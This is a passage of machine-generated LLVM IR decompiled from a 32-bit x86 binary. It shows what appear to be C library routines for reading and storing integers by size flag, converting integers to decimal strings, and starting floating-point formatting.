dec_label_pc_804fb16.dec_label_pc_804fb35_crit_edge: ; preds = %dec_label_pc_804fb16
  %v0_804fb35.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fb35

dec_label_pc_804fb35:                             ; preds = %dec_label_pc_804fb16.dec_label_pc_804fb35_crit_edge, %dec_label_pc_804fb11, %dec_label_pc_804fb04
  %v2_804fb3a = phi i32 [ %v0_804fb35.pre, %dec_label_pc_804fb16.dec_label_pc_804fb35_crit_edge ], [ %v0_804fb28, %dec_label_pc_804fb11 ], [ %v0_804fb28, %dec_label_pc_804fb04 ]
  %v1_804fb35 = inttoptr i32 %v2_804fb3a to i32*
  %v2_804fb35 = load i32, i32* %v1_804fb35, align 4
  %v1_804fb37 = and i32 %v2_804fb35, -4
  store i32 %v1_804fb37, i32* %eax.global-to-local, align 4
  %v1_804fb3a = trunc i32 %v1_804fb37 to i16
  %v3_804fb3a = inttoptr i32 %v2_804fb3a to i16*
  store i16 %v1_804fb3a, i16* %v3_804fb3a, align 2
  %v0_804fb3d = load i32, i32* @ebx, align 4
  %v1_804fb3d = add i32 %v0_804fb3d, 8
  %v2_804fb3d = inttoptr i32 %v1_804fb3d to i32*
  %v3_804fb3d = load i32, i32* %v2_804fb3d, align 4
  store i32 %v3_804fb3d, i32* %eax.global-to-local, align 4
  %v2_804fb40 = add i32 %v0_804fb3d, 24
  %v3_804fb40 = inttoptr i32 %v2_804fb40 to i32*
  store i32 %v3_804fb3d, i32* %v3_804fb40, align 4
  %v0_804fb43 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fb43 = load i32, i32* @ebx, align 4
  %v2_804fb43 = add i32 %v1_804fb43, 16
  %v3_804fb43 = inttoptr i32 %v2_804fb43 to i32*
  store i32 %v0_804fb43, i32* %v3_804fb43, align 4
  %v0_804fb46 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fb46 = load i32, i32* @ebx, align 4
  %v2_804fb46 = add i32 %v1_804fb46, 20
  %v3_804fb46 = inttoptr i32 %v2_804fb46 to i32*
  store i32 %v0_804fb46, i32* %v3_804fb46, align 4
  %v0_804fb49.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fb49

dec_label_pc_804fb49:                             ; preds = %dec_label_pc_804faff, %dec_label_pc_804fb35
  %v2_804fb50 = phi i32 [ %v0_804fb28, %dec_label_pc_804faff ], [ %v0_804fb49.pre, %dec_label_pc_804fb35 ]
  %v1_804fb49 = inttoptr i32 %v2_804fb50 to i32*
  %v2_804fb49 = load i32, i32* %v1_804fb49, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_804fb4d = or i32 %v2_804fb49, 64
  store i32 %v1_804fb4d, i32* %eax.global-to-local, align 4
  %v1_804fb50 = trunc i32 %v1_804fb4d to i16
  %v3_804fb50 = inttoptr i32 %v2_804fb50 to i16*
  store i16 %v1_804fb50, i16* %v3_804fb50, align 2
  %v0_804fb53 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fb53 = urem i32 %v0_804fb53, 65536
  store i32 %v1_804fb53, i32* %eax.global-to-local, align 4
  %v3_804fb56 = and i32 %v0_804fb53, 2816
  %v4_804fb56 = icmp eq i32 %v3_804fb56, 0
  %v1_804fb59 = icmp eq i1 %v4_804fb56, false
  br i1 %v1_804fb59, label %dec_label_pc_804fb61, label %dec_label_pc_804fb5b

dec_label_pc_804fb5b:                             ; preds = %dec_label_pc_804fb49
  %v0_804fb5b = load i32, i32* @ebx, align 4
  %v1_804fb5b = add i32 %v0_804fb5b, 12
  %v2_804fb5b = inttoptr i32 %v1_804fb5b to i32*
  %v3_804fb5b = load i32, i32* %v2_804fb5b, align 4
  store i32 %v3_804fb5b, i32* %eax.global-to-local, align 4
  %v2_804fb5e = add i32 %v0_804fb5b, 28
  %v3_804fb5e = inttoptr i32 %v2_804fb5e to i32*
  store i32 %v3_804fb5b, i32* %v3_804fb5e, align 4
  br label %dec_label_pc_804fb61

dec_label_pc_804fb61:                             ; preds = %dec_label_pc_804fb49, %dec_label_pc_804faf2, %dec_label_pc_804fb5b
  %v0_804fb61 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804fb61, i32* %eax.global-to-local, align 4
  %v2_804fb63 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fb63, i32* %edx.global-to-local, align 4
  store i32 %v0_804fac0, i32* @ebx, align 4
  ret i32 %v0_804fb61

; uselistorder directives
  uselistorder i32 %v0_804fb53, { 1, 0 }
  uselistorder i32 %v1_804fb16, { 1, 0, 2 }
  uselistorder i32 %v0_804fb28, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_804facc, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804fac0, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i32 1024, { 0, 11, 3, 6, 5, 12, 4, 1, 2, 7, 9, 10, 8 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fb61, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fb49, { 1, 0 }
  uselistorder label %dec_label_pc_804fadf, { 1, 0 }
}

define i32 @function_804fb68() local_unnamed_addr {
dec_label_pc_804fb68:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v5_804fb68 = icmp slt i32 %tmp4, 0
  %v3_804fb99 = and i32 %tmp3, 2048
  %v4_804fb99 = icmp eq i32 %v3_804fb99, 0
  br i1 %v5_804fb68, label %dec_label_pc_804fb99, label %dec_label_pc_804fb77

dec_label_pc_804fb77:                             ; preds = %dec_label_pc_804fb68
  %v1_804fb7a = icmp eq i1 %v4_804fb99, false
  br i1 %v1_804fb7a, label %dec_label_pc_804fb9e, label %dec_label_pc_804fb7c

dec_label_pc_804fb7c:                             ; preds = %dec_label_pc_804fb77
  %v6_804fb7c = icmp eq i32 %tmp3, 256
  %v1_804fb82 = inttoptr i32 %tmp to i32*
  %v2_804fb82 = load i32, i32* %v1_804fb82, align 4
  %v1_804fb84 = icmp eq i1 %v6_804fb7c, false
  br i1 %v1_804fb84, label %dec_label_pc_804fb8b, label %dec_label_pc_804fb86

dec_label_pc_804fb86:                             ; preds = %dec_label_pc_804fb7c
  %v1_804fb86 = urem i32 %v2_804fb82, 256
  br label %dec_label_pc_804fb96

dec_label_pc_804fb8b:                             ; preds = %dec_label_pc_804fb7c
  %v6_804fb8b = icmp eq i32 %tmp3, 512
  %v1_804fb91 = icmp eq i1 %v6_804fb8b, false
  br i1 %v1_804fb91, label %dec_label_pc_804fb96, label %dec_label_pc_804fb93

dec_label_pc_804fb93:                             ; preds = %dec_label_pc_804fb8b
  %v1_804fb93 = urem i32 %v2_804fb82, 65536
  br label %dec_label_pc_804fb96

dec_label_pc_804fb96:                             ; preds = %dec_label_pc_804fb8b, %dec_label_pc_804fb86, %dec_label_pc_804fb93
  %v0_804fb98 = phi i32 [ %v2_804fb82, %dec_label_pc_804fb8b ], [ %v1_804fb86, %dec_label_pc_804fb86 ], [ %v1_804fb93, %dec_label_pc_804fb93 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_804fb98

dec_label_pc_804fb99:                             ; preds = %dec_label_pc_804fb68
  br i1 %v4_804fb99, label %dec_label_pc_804fba4, label %dec_label_pc_804fb9e

dec_label_pc_804fb9e:                             ; preds = %dec_label_pc_804fb99, %dec_label_pc_804fb77
  %v1_804fb9e = add i32 %tmp, 4
  %v2_804fb9e = inttoptr i32 %v1_804fb9e to i32*
  %v3_804fb9e = load i32, i32* %v2_804fb9e, align 4
  store i32 %v3_804fb9e, i32* @edx, align 4
  %v1_804fba1 = inttoptr i32 %tmp to i32*
  %v2_804fba1 = load i32, i32* %v1_804fba1, align 4
  ret i32 %v2_804fba1

dec_label_pc_804fba4:                             ; preds = %dec_label_pc_804fb99
  %v6_804fba4 = icmp eq i32 %tmp3, 256
  %v1_804fbaa = inttoptr i32 %tmp to i32*
  %v2_804fbaa = load i32, i32* %v1_804fbaa, align 4
  %v1_804fbac = icmp eq i1 %v6_804fba4, false
  br i1 %v1_804fbac, label %dec_label_pc_804fbb3, label %dec_label_pc_804fbae

dec_label_pc_804fbae:                             ; preds = %dec_label_pc_804fba4
  %v1_804fbae = mul i32 %v2_804fbaa, 16777216
  %v2_804fbae = sdiv i32 %v1_804fbae, 16777216
  br label %dec_label_pc_804fbbc

dec_label_pc_804fbb3:                             ; preds = %dec_label_pc_804fba4
  %v6_804fbb3 = icmp eq i32 %tmp3, 512
  %v1_804fbb9 = icmp eq i1 %v6_804fbb3, false
  br i1 %v1_804fbb9, label %dec_label_pc_804fbbc, label %dec_label_pc_804fbbb

dec_label_pc_804fbbb:                             ; preds = %dec_label_pc_804fbb3
  %v1_804fbbb = mul i32 %v2_804fbaa, 65536
  %v2_804fbbb = sdiv i32 %v1_804fbbb, 65536
  br label %dec_label_pc_804fbbc

dec_label_pc_804fbbc:                             ; preds = %dec_label_pc_804fbb3, %dec_label_pc_804fbae, %dec_label_pc_804fbbb
  %v0_804fbbc = phi i32 [ %v2_804fbaa, %dec_label_pc_804fbb3 ], [ %v2_804fbae, %dec_label_pc_804fbae ], [ %v2_804fbbb, %dec_label_pc_804fbbb ]
  %v1_804fbbc = ashr i32 %v0_804fbbc, 31
  store i32 %v1_804fbbc, i32* @edx, align 4
  ret i32 %v0_804fbbc

; uselistorder directives
  uselistorder i32 %v0_804fbbc, { 1, 0 }
  uselistorder i32 %v2_804fbaa, { 2, 0, 1 }
  uselistorder i32 %v2_804fb82, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804fbbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fb96, { 2, 0, 1 }
}

define i32 @function_804fbc0() local_unnamed_addr {
dec_label_pc_804fbc0:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_4()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804fbc0 = load i32, i32* @ebx, align 4
  store i32 %v0_804fbc0, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_804fbc5 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_804fbc5, i32* %ebx.global-to-local, align 4
  %v4_804fbc9 = trunc i32 %tmp4 to i16
  %v6_804fbd1 = icmp eq i32 %tmp6, 256
  %v1_804fbd7 = icmp eq i1 %v6_804fbd1, false
  br i1 %v1_804fbd7, label %dec_label_pc_804fbdd, label %dec_label_pc_804fbd9

dec_label_pc_804fbd9:                             ; preds = %dec_label_pc_804fbc0
  %v2_804fbd9 = trunc i32 %tmp4 to i8
  %v4_804fbd9 = bitcast i16* %tmp5 to i8*
  store i8 %v2_804fbd9, i8* %v4_804fbd9, align 1
  br label %dec_label_pc_804fbfb

dec_label_pc_804fbdd:                             ; preds = %dec_label_pc_804fbc0
  %v6_804fbdd = icmp eq i32 %tmp6, 2048
  %v1_804fbe3 = icmp eq i1 %v6_804fbdd, false
  br i1 %v1_804fbe3, label %dec_label_pc_804fbec, label %dec_label_pc_804fbe5

dec_label_pc_804fbe5:                             ; preds = %dec_label_pc_804fbdd
  %sext2 = mul i32 %tmp4, 65536
  %v1_804fbe5 = sdiv i32 %sext2, 65536
  %v3_804fbe5 = bitcast i16* %tmp5 to i32*
  store i32 %v1_804fbe5, i32* %v3_804fbe5, align 4
  %v0_804fbe7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fbe7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804fbe7 = add i32 %v1_804fbe7, 4
  %v3_804fbe7 = inttoptr i32 %v2_804fbe7 to i32*
  store i32 %v0_804fbe7, i32* %v3_804fbe7, align 4
  br label %dec_label_pc_804fbfb

dec_label_pc_804fbec:                             ; preds = %dec_label_pc_804fbdd
  %v6_804fbec = icmp eq i32 %tmp6, 512
  %v1_804fbf2 = icmp eq i1 %v6_804fbec, false
  br i1 %v1_804fbf2, label %dec_label_pc_804fbf9, label %dec_label_pc_804fbf4

dec_label_pc_804fbf4:                             ; preds = %dec_label_pc_804fbec
  store i16 %v4_804fbc9, i16* %tmp5, align 2
  br label %dec_label_pc_804fbfb

dec_label_pc_804fbf9:                             ; preds = %dec_label_pc_804fbec
  %sext3 = mul i32 %tmp4, 65536
  %v1_804fbf9 = sdiv i32 %sext3, 65536
  %v3_804fbf9 = bitcast i16* %tmp5 to i32*
  store i32 %v1_804fbf9, i32* %v3_804fbf9, align 4
  br label %dec_label_pc_804fbfb

dec_label_pc_804fbfb:                             ; preds = %dec_label_pc_804fbf4, %dec_label_pc_804fbe5, %dec_label_pc_804fbd9, %dec_label_pc_804fbf9
  %v2_804fbfb = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fbfb, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_804fbfc = sdiv i32 %sext, 65536
  ret i32 %v1_804fbfc

; uselistorder directives
  uselistorder label %dec_label_pc_804fbfb, { 3, 0, 1, 2 }
}

define i32 @function_804fc00(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804fc00:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_804fc0b = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fc0b, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_804fc17 = icmp slt i32 %arg4, 0
  %v1_804fc19 = icmp eq i1 %v2_804fc17, false
  br i1 %v1_804fc19, label %dec_label_pc_804fc3a, label %dec_label_pc_804fc1b

dec_label_pc_804fc1b:                             ; preds = %dec_label_pc_804fc00
  %v1_804fc1b = sub i32 0, %arg4
  store i32 %v1_804fc1b, i32* %esi.global-to-local, align 4
  %v2_804fc1d = icmp slt i32 %arg3, 0
  %v1_804fc1f = icmp eq i1 %v2_804fc1d, false
  br i1 %v1_804fc1f, label %dec_label_pc_804fc3a, label %dec_label_pc_804fc21

dec_label_pc_804fc21:                             ; preds = %dec_label_pc_804fc1b
  %v1_804fc21 = sub i32 0, %arg2
  %v5_804fc21 = icmp ne i32 %arg2, 0
  store i32 %v1_804fc21, i32* %ecx.global-to-local, align 4
  %v2_804fc23 = zext i1 %v5_804fc21 to i32
  %v3_804fc23 = add i32 %v2_804fc23, %arg3
  %v1_804fc26 = sub i32 0, %v3_804fc23
  store i32 %v1_804fc26, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fc3a

dec_label_pc_804fc3a:                             ; preds = %dec_label_pc_804fc00, %dec_label_pc_804fc1b, %dec_label_pc_804fc21
  %v0_804fc3f = phi i32 [ %v1_804fc1b, %dec_label_pc_804fc21 ], [ %v1_804fc1b, %dec_label_pc_804fc1b ], [ %arg4, %dec_label_pc_804fc00 ]
  %storemerge11 = phi i32 [ 1, %dec_label_pc_804fc21 ], [ 0, %dec_label_pc_804fc1b ], [ 0, %dec_label_pc_804fc00 ]
  %div = udiv i32 -1, %v0_804fc3f
  %tmp30 = urem i32 -1, %v0_804fc3f
  store i8 0, i8* %arg1, align 1
  %v1_804fc44 = add i32 %tmp30, 1
  %v1_804fc45 = load i32, i32* %esi.global-to-local, align 4
  %v12_804fc45 = icmp eq i32 %v1_804fc44, %v1_804fc45
  %v1_804fc4f = icmp eq i1 %v12_804fc45, false
  br i1 %v1_804fc4f, label %dec_label_pc_804fc5e, label %dec_label_pc_804fc51

dec_label_pc_804fc51:                             ; preds = %dec_label_pc_804fc3a
  %v1_804fc51 = add i32 %div, 1
  br label %dec_label_pc_804fc5e

dec_label_pc_804fc5e:                             ; preds = %dec_label_pc_804fc3a, %dec_label_pc_804fc51
  %stack_var_-20.0.off0 = phi i32 [ %v1_804fc44, %dec_label_pc_804fc3a ], [ 0, %dec_label_pc_804fc51 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_804fc3a ], [ %v1_804fc51, %dec_label_pc_804fc51 ]
  %v0_804fc5e = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804fc5e, i32* %ebp.global-to-local, align 4
  %v0_804fc60 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804fc60, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804fc64

dec_label_pc_804fc64:                             ; preds = %dec_label_pc_804fcb2, %dec_label_pc_804fc5e
  %v0_804fc9b = phi i32 [ %v0_804fcb4, %dec_label_pc_804fcb2 ], [ %v0_804fc5e, %dec_label_pc_804fc5e ]
  %v0_804fc68 = phi i32 [ %v1_804fcb6, %dec_label_pc_804fcb2 ], [ %v0_804fc60, %dec_label_pc_804fc5e ]
  %v1_804fc64 = icmp eq i32 %v0_804fc68, 0
  br i1 %v1_804fc64, label %dec_label_pc_804fc9b, label %dec_label_pc_804fc68

dec_label_pc_804fc68:                             ; preds = %dec_label_pc_804fc64
  %v0_804fc6c = load i32, i32* %esi.global-to-local, align 4
  %div6 = udiv i32 %v0_804fc68, %v0_804fc6c
  %tmp31 = urem i32 %v0_804fc68, %v0_804fc6c
  store i32 %div6, i32* %ebx.global-to-local, align 4
  %div7 = udiv i32 %v0_804fc9b, %v0_804fc6c
  %tmp32 = urem i32 %v0_804fc9b, %v0_804fc6c
  store i32 %div7, i32* %ebp.global-to-local, align 4
  %v6_804fc7f = mul i32 %tmp31, %stack_var_-20.0.off0
  %v2_804fc83 = add i32 %tmp32, %v6_804fc7f
  %v8_804fc89 = mul i32 %tmp31, %stack_var_-24.0.in
  %v2_804fc8e = add i32 %div7, %v8_804fc89
  store i32 %v2_804fc8e, i32* %ecx.global-to-local, align 4
  %div8 = udiv i32 %v2_804fc83, %v0_804fc6c
  %tmp33 = urem i32 %v2_804fc83, %v0_804fc6c
  %v2_804fc96 = add i32 %div8, %v2_804fc8e
  br label %dec_label_pc_804fca3

dec_label_pc_804fc9b:                             ; preds = %dec_label_pc_804fc64
  %v0_804fc9f = load i32, i32* %esi.global-to-local, align 4
  %div10 = udiv i32 %v0_804fc9b, %v0_804fc9f
  %tmp34 = urem i32 %v0_804fc9b, %v0_804fc9f
  br label %dec_label_pc_804fca3

dec_label_pc_804fca3:                             ; preds = %dec_label_pc_804fc68, %dec_label_pc_804fc9b
  %v13_804fca9 = phi i32 [ %tmp33, %dec_label_pc_804fc68 ], [ %tmp34, %dec_label_pc_804fc9b ]
  %storemerge = phi i32 [ %v2_804fc96, %dec_label_pc_804fc68 ], [ %div10, %dec_label_pc_804fc9b ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_804fca3 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fca3 = add i32 %v0_804fca3, -1
  store i32 %v1_804fca3, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_804fca9, 10
  br i1 %tmp, label %dec_label_pc_804fca9, label %dec_label_pc_804fcae

dec_label_pc_804fca9:                             ; preds = %dec_label_pc_804fca3
  %v2_804fca9 = add i32 %v13_804fca9, 48
  %v12_804fca9 = and i32 %v2_804fca9, 255
  %v14_804fca9 = and i32 %v13_804fca9, -256
  %v15_804fca9 = or i32 %v12_804fca9, %v14_804fca9
  br label %dec_label_pc_804fcb2

dec_label_pc_804fcae:                             ; preds = %dec_label_pc_804fca3
  %v6_804fcae = add i32 %v13_804fca9, %arg5
  %v21_804fcae = and i32 %v6_804fcae, 255
  %v23_804fcae = and i32 %v13_804fca9, -256
  %v24_804fcae = or i32 %v21_804fcae, %v23_804fcae
  br label %dec_label_pc_804fcb2

dec_label_pc_804fcb2:                             ; preds = %dec_label_pc_804fca9, %dec_label_pc_804fcae
  %storemerge9 = phi i32 [ %v15_804fca9, %dec_label_pc_804fca9 ], [ %v24_804fcae, %dec_label_pc_804fcae ]
  %v1_804fcb2 = trunc i32 %storemerge9 to i8
  %v3_804fcb2 = inttoptr i32 %v1_804fca3 to i8*
  store i8 %v1_804fcb2, i8* %v3_804fcb2, align 1
  %v0_804fcb4 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804fcb6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804fcb6 = or i32 %v1_804fcb6, %v0_804fcb4
  %v3_804fcb6 = icmp eq i32 %v2_804fcb6, 0
  %v1_804fcb8 = icmp eq i1 %v3_804fcb6, false
  br i1 %v1_804fcb8, label %dec_label_pc_804fc64, label %dec_label_pc_804fcba

dec_label_pc_804fcba:                             ; preds = %dec_label_pc_804fcb2
  %v4_804fcba = icmp eq i32 %storemerge11, 0
  br i1 %v4_804fcba, label %dec_label_pc_804fcc5, label %dec_label_pc_804fcc1

dec_label_pc_804fcc1:                             ; preds = %dec_label_pc_804fcba
  %v0_804fcc1 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fcc1 = add i32 %v0_804fcc1, -1
  store i32 %v1_804fcc1, i32* %edi.global-to-local, align 4
  %v1_804fcc2 = inttoptr i32 %v1_804fcc1 to i8*
  store i8 45, i8* %v1_804fcc2, align 1
  br label %dec_label_pc_804fcc5

dec_label_pc_804fcc5:                             ; preds = %dec_label_pc_804fcba, %dec_label_pc_804fcc1
  %v0_804fcc8 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fcc8

; uselistorder directives
  uselistorder i32 %v13_804fca9, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_804fc83, { 1, 0 }
  uselistorder i32 %v0_804fc6c, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_804fc68, { 1, 0, 2 }
  uselistorder i32 %v0_804fc9b, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804fc44, { 1, 0 }
  uselistorder i32 %v0_804fc3f, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fcc5, { 1, 0 }
  uselistorder label %dec_label_pc_804fcb2, { 1, 0 }
  uselistorder label %dec_label_pc_804fca3, { 1, 0 }
  uselistorder label %dec_label_pc_804fc5e, { 1, 0 }
  uselistorder label %dec_label_pc_804fc3a, { 2, 1, 0 }
}

define i32 @function_804fcd0() local_unnamed_addr {
dec_label_pc_804fcd0:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp145 = call i16 @__decompiler_undefined_function_3()
  %tmp154 = call x86_fp80 @__decompiler_undefined_function_10()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804fcd1 = load i32, i32* @edi, align 4
  %v0_804fcd2 = load i32, i32* @esi, align 4
  %v0_804fcd3 = load i32, i32* @ebx, align 4
  store i32 %v0_804fcd3, i32* %stack_var_-16, align 4
  store i32 %tmp155, i32* %eax.global-to-local, align 4
  store i32 %tmp155, i32* %edx.global-to-local, align 4
  %v4_804fce8 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_804fce8 = add i3 %v4_804fce8, -1
  store x86_fp80 %tmp154, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_804fce8, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_804fcef = add i32 %tmp155, 4
  %v2_804fcef = inttoptr i32 %v1_804fcef to i32*
  %v3_804fcef = load i32, i32* %v2_804fcef, align 4
  store i32 %v3_804fcef, i32* %eax.global-to-local, align 4
  %v1_804fcf6 = add i32 %tmp155, 8
  %v2_804fcf6 = inttoptr i32 %v1_804fcf6 to i8*
  %v3_804fcf6 = load i8, i8* %v2_804fcf6, align 1
  %v4_804fcf6 = zext i8 %v3_804fcf6 to i32
  %v6_804fcf6 = and i32 %v0_804fcd3, -256
  %v7_804fcf6 = or i32 %v4_804fcf6, %v6_804fcf6
  store i32 %v7_804fcf6, i32* %ebx.global-to-local, align 4
  %v1_804fcf9 = inttoptr i32 %tmp155 to i32*
  %v2_804fcf9 = load i32, i32* %v1_804fcf9, align 4
  store i32 %v2_804fcf9, i32* %ebp.global-to-local, align 4
  %v2_804fd05 = or i8 %v3_804fcf6, 32
  %v7_804fd05 = zext i8 %v2_804fd05 to i32
  %v9_804fd05 = and i32 %v3_804fcef, -256
  %v10_804fd05 = or i32 %v7_804fd05, %v9_804fd05
  store i32 %v10_804fd05, i32* %eax.global-to-local, align 4
  %v10_804fd07 = icmp eq i8 %v2_804fd05, 97
  %v1_804fd0d = icmp eq i1 %v10_804fd07, false
  br i1 %v1_804fd0d, label %dec_label_pc_804fd16, label %dec_label_pc_804fd0f

dec_label_pc_804fd0f:                             ; preds = %dec_label_pc_804fcd0
  %v2_804fd0f = add i8 %v3_804fcf6, 6
  %v15_804fd0f = zext i8 %v2_804fd0f to i32
  %v18_804fd0f = or i32 %v15_804fd0f, %v6_804fcf6
  store i32 %v18_804fd0f, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fd16

dec_label_pc_804fd16:                             ; preds = %dec_label_pc_804fcd0, %dec_label_pc_804fd0f
  %stack_var_-207.0 = phi i8 [ %v3_804fcf6, %dec_label_pc_804fcd0 ], [ %v2_804fd0f, %dec_label_pc_804fd0f ]
  store i32 %tmp155, i32* %edx.global-to-local, align 4
  %v2_804fd1d = icmp slt i32 %v2_804fcf9, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_804fd2c = select i1 %v2_804fd1d, i32 6, i32 %v2_804fcf9
  store i32 %v3_804fd2c, i32* %ebp.global-to-local, align 4
  %v1_804fd2f = add i32 %tmp155, 12
  %v2_804fd2f = inttoptr i32 %v1_804fd2f to i32*
  %v3_804fd2f = load i32, i32* %v2_804fd2f, align 4
  store i32 %v3_804fd2f, i32* %eax.global-to-local, align 4
  %v2_804fd32 = and i32 %v3_804fd2f, 2
  %v3_804fd32 = icmp eq i32 %v2_804fd32, 0
  br i1 %v3_804fd32, label %dec_label_pc_804fd40, label %dec_label_pc_804fd4c

dec_label_pc_804fd40:                             ; preds = %dec_label_pc_804fd16
  %v2_804fd40 = urem i32 %v3_804fd2f, 2
  %tmp191 = trunc i32 %v2_804fd40 to i8
  %tmp = sub nsw i8 0, %tmp191
  %tmp192 = and i8 %tmp, 32
  br label %dec_label_pc_804fd4c

dec_label_pc_804fd4c:                             ; preds = %dec_label_pc_804fd40, %dec_label_pc_804fd16
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_804fd16 ], [ %tmp192, %dec_label_pc_804fd40 ]
  %not.v5_804fd4c = fcmp uno x86_fp80 %tmp154, 0xK00000000000000000000
  br i1 %not.v5_804fd4c, label %dec_label_pc_804fdc3, label %dec_label_pc_804fd6e

dec_label_pc_804fd6e:                             ; preds = %dec_label_pc_804fd4c
  %v1_804fd6e = add i3 %v4_804fce8, -2
  store i3 %v1_804fd6e, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp154, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_804fd72 = fcmp ogt x86_fp80 %tmp154, 0xK00000000000000000000
  br i1 %v4_804fd72, label %bb, label %bb179

bb:                                               ; preds = %dec_label_pc_804fd6e
  br label %dec_label_pc_804fdfe

bb179:                                            ; preds = %dec_label_pc_804fd6e
  %v5_804fd72 = fcmp olt x86_fp80 %tmp154, 0xK00000000000000000000
  br i1 %v5_804fd72, label %bb180, label %dec_label_pc_804fd76

bb180:                                            ; preds = %bb179
  br label %dec_label_pc_804fdfe

dec_label_pc_804fd76:                             ; preds = %bb179
  %not.v4_804fd70 = fcmp une x86_fp80 %tmp154, 0xK00000000000000000000
  br i1 %not.v4_804fd70, label %dec_label_pc_804fdfe, label %dec_label_pc_804fe93

dec_label_pc_804fdc3:                             ; preds = %dec_label_pc_804fd4c
  store i3 %v4_804fce8, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp155, i32* %ebx.global-to-local, align 4
  %v1_804fdca = add i32 %tmp155, 16
  %v2_804fdca = inttoptr i32 %v1_804fdca to i32*
  store i32 32, i32* %v2_804fdca, align 4
  %v4_804fdd1 = add i8 %stack_var_-207.0, -96
  %v6_804fdd1 = sub i8 95, %stack_var_-207.0
